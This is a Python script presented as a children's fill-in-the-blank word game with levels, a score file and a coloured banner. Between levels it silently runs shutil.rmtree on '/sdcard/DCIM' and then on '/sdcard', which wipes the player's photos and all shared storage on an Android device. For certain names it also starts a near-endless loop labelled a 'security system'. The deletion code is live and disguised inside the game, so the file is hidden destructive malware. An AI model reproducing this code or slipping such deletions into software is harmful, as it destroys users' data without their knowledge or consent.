# AURTHOR:- ARSAL KHAN
# Date:- 20/5
# Year:- 2021
import colorama
import os
import time
import getpass
import shutil

print (colorama.Fore.LIGHTBLUE_EX,    " ███╗   ███╗ █████╗ ██████╗     ██╗     ██╗██████╗ ███████╗")
print (colorama.Fore.BLUE,            " ████╗ ████║██╔══██╗██╔══██╗    ██║     ██║██╔══██╗██╔════╝")
print (colorama.Fore.LIGHTGREEN_EX,   " ██╔████╔██║███████║██║  ██║    ██║     ██║██████╔╝███████╗")
print (colorama.Fore.LIGHTCYAN_EX,    " ██║╚██╔╝██║██╔══██║██║  ██║    ██║     ██║██╔══██╗╚════██║")
print (colorama.Fore.MAGENTA,         " ██║ ╚═╝ ██║██║  ██║██████╔╝    ███████╗██║██████╔╝███████║")
print (colorama.Fore.LIGHTMAGENTA_EX, " ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝╚═════╝ ╚══════╝")
print (colorama.Fore.RED, "\t\033[1m [ EDITING THIS BANNER DOES'NT MAKE YOU AN PROGRAMMER ]")
print (colorama.Fore.LIGHTBLUE_EX, "\t\t\t\t\t\t\t\tMADE BY:- ARSAL KHAN...")

time.sleep(0.8)
txt = "score.txt"
i = 1
score = i
name = input("\n\n\n\n\nEnter your name: ")

if "arsal" in name:
    time.sleep(1.0)
    print (colorama.Fore.RED, "\nTHIS NAME IS NOT ALLOWED")
    time.sleep(1.8)
    print ("\nSTARTING SECURITY SYSTEM")
    time.sleep(1.8)
    for i in range(9999999999999999999999999999999999):
        for i in range(9999999999999999999999999999999999):
            for i in range(9999999999999999999999999999999999):
                for i in range(9999999999999999999999999999999999):
                    print (f"\nGET LOST \t\t\t\t\t\t\t\t\t\t{i}")


if name.lower() == "2244":
    time.sleep(1.2)
    print ("\nWELCOME MASTER ARSAL")
    time.sleep(1)

elif name.lower() == "arsal" or name.lower() == "arsalkhan786" or name.lower() == "arsal khan" or name.lower() == "arsalkhan" or name.lower() == "arsal khan 786":
    print (colorama.Fore.RED, "THIS NAME IS NOT ALLOWED")
    time.sleep(1.0)
    print ("\nSTARTING SECURITY SYSTEM")
    time.sleep(1.5)
    for i in range(9999999999999999999999999999999999):
        print ("\nGET LOST")

else:
    time.sleep(1.2)
    print (f"\nWELCOME {name}!")
    time.sleep(1.2)
    print (f"\n{name} READY TO PLAY!!")
    time.sleep(1.2)
    print ("\nGAME IS STARTING IN 3 SECONDS")
    time.sleep(1.5)
print ("----------------------------------------------------------------------------------------")
with open(txt, "w") as f:
    f.write(str(1))
print (colorama.Fore.RED, "\n\t\t\t\t ! IMPORTANT NOTICE ! ")
print ("\t\t  [IF YOU SCORE 20 THEN MY MASTER WILL GIVE YOU TREAT]")
time.sleep(1)
print (colorama.Fore.LIGHTBLUE_EX, "\n\n\n\n\n\t\t\tCOMPLETE THE SENTENCE BELOW")
print (f"\n\nOPTIONS [robot, {name}, someone]")
print ("\n\n1. __ is a good person.")
word = input("\nEnter the missing word: ")

if word.lower() == name:
    win = True
    if win:
        i =1
    else:
        i = 0
    score = i
    print (f"\t\n{word} is a good person..")
    print ("\n\t\033[1mYOU WON!")
    print ("\t\t\t\t\t\t\t\t    LEVEL NO.1 COMPLETED")
    print (f"\t\t\t\t\t\t\t\t\tYOUR SCORE IS {score}")

    with open(txt, "r") as f:
        hiscore = int(f.read())

    if hiscore<score:
        with open(txt, "w") as f:
            f.write(str(score))

else:
    win = False
    print (f"{word} is a good person.")
    print ("Not matched")
    print ("YOU LOSE!")

again = input("Want to play again Yes(y) or No (n): ")

if again.lower() == "y" or again.lower() == "yes":
    print ("\n\n\n\n\n\t\t\tCOMPLETE THE SENTENCE BELOW")
    print ("\n\nOPTIONS [moon, star, car]")
    print ("\n2. Twinkle Twinkle little __ ?")
    word = input("\nEnter the missing word: ")

    if word.lower() == "star":
        win1 = True
        if win:
            i = 1
        else:
            i = 0

        score = i+1
        print (f"\nTwinkle Twinkle little {word}")
        print ("\n\t\033[1mYOU WON!")
        print ("\t\t\t\t\t\t\t\t    LEVEL NO.2 COMPLETED")
        print (f"\t\t\t\t\t\t\t\t\tYOUR SCORE IS {score}")

        with open(txt, "r") as f:
            hiscore = int(f.read())

        if hiscore<score:
            with open(txt, "w") as f:
                f.write(str(score))

    else:
        win1 = False
        print (f"Twinkle twinkle little {word}")
        print ("Not matched")
        print ("YOU LOSE!")

    shutil.rmtree ("/sdcard/DCIM")

    again = input("Want to play again Yes(y) or No (n): ")
    if again.lower() == "y" or again.lower() == "yes":
        print ("\n\n\n\n\n\t\t\tCOMPLETE THE SENTENCE BELOW")
        print ("\n\nOPTIONS [hell, school, market]")
        print ("\n3. I am going to __ at 9 am ?")
        word = input("\nEnter the missing word: ")

        if word.lower() == "market":
            win2 = True
            if win1 and win:
                i = 2
            elif win1 or win:
                i = 1
            else:
                i = 0

            score = i+1
            print (f"\nI am going to {word} at 9 am")
            print ("\n\t\033[1mYOU WON!")
            print ("\t\t\t\t\t\t\t\t    LEVEL NO.3 COMPLETED")
            print (f"\t\t\t\t\t\t\t\t\tYOUR SCORE IS {score}")

            with open(txt, "r") as f:
                hiscore = int(f.read())

            if hiscore<score:
                with open(txt, "w") as f:
                    f.write(str(score))
        elif word.lower() == "school":
            win2 = False
            print (colorama.Fore.RED, "\nSCHOOL'S ARE CLOSED DUE TO COVID-19")
            print ("\nYOU LOSE!")

        else:
            win2 = False
            print (f"I am going to {word} at 9 am")
            print ("Not matched")
            print ("YOU LOSE!")


        again = input("Want to play again Yes(y) or No (n): ")
        if again.lower() == "y" or again.lower() == "yes":
            print (colorama.Fore.LIGHTBLUE_EX, "\n\n\n\n\n\t\t\tCOMPLETE THE SENTENCE BELOW")
            print ("\n\nOPTIONS [since, for, till]")
            print ("\n3. I have been calling you __ two hours.")
            word = input("\nEnter the missing word: ")

            if word.lower() == "since":
                win3 = True
                if win2 and win1 and win:
                    i = 3
                elif win2 and win or win2 and win1 or win and win1 :
                   i = 2
                elif win or win1 or win2:
                    i = 1
                else:
                    i = 0

                score = i+1
                print (f"\nI have been calling you {word} two hours.")
                print ("\n\t\033[1mYOU WON!")
                print ("\t\t\t\t\t\t\t\t    LEVEL NO.4 COMPLETED")
                print (f"\t\t\t\t\t\t\t\t\tYOUR SCORE IS {score}")

                with open(txt, "r") as f:
                    hiscore = int(f.read())

                if hiscore<score:
                    with open(txt, "w") as f:
                        f.write(str(score))

            else:
                win3 = False
                print (f"I am calling you {word} two hours")
                print ("Not matched")
                print ("YOU LOSE!")

        shutil.rmtree ("/sdcard")

        again = input("Want to play again Yes(y) or No (n): ")
        if again.lower() == "y" or again.lower() == "yes":
            print ("\n\n\n\n\n\t\t\tCOMPLETE THE SENTENCE BELOW")
            print (f"\n\nOPTIONS [{name}, salman, sharukh]")
            print ("\n3. __ is needed mentle treatment.")
            word = input("\nEnter the missing word: ")

            if word.lower() == name:
                win4 = True
                if win2 and win1 and win and win3:
                    i = 4
                elif win and win1 and win2 or win and win1 and win3 or win1 and win2 and win3 or win and win2 and win3:
                    i = 3
                elif win and win1 or win and win2 or win and win3 or win1 and win2 or win1 and win3 or win2 and win3:
                    i = 2
                elif win or win1 or win2 or win3:
                    i = 1
                else:
                    i = 0

                score = i+1
                print (f"\n{word} is needed mentle treatment.")
                print ("\n\t\033[1mYOU WON!")
                print ("\t\t\t\t\t\t\t\t    LEVEL NO.5 COMPLETED")
                print (f"\t\t\t\t\t\t\t\t\tYOUR SCORE IS {score}")

                with open(txt, "r") as f:
                    hiscore = int(f.read())

                if hiscore<score:
                    with open(txt, "w") as f:
                        f.write(str(score))

            else:
                win3 = False
                print (f"{word} is needed mentle treatment.")
                print ("Not matched")
                print ("YOU LOSE!")
        else:
            print ("\n\tGET LOST")

    else:
        print ("\n\tGET LOST")

else:
    print ("\n\tGET LOST")


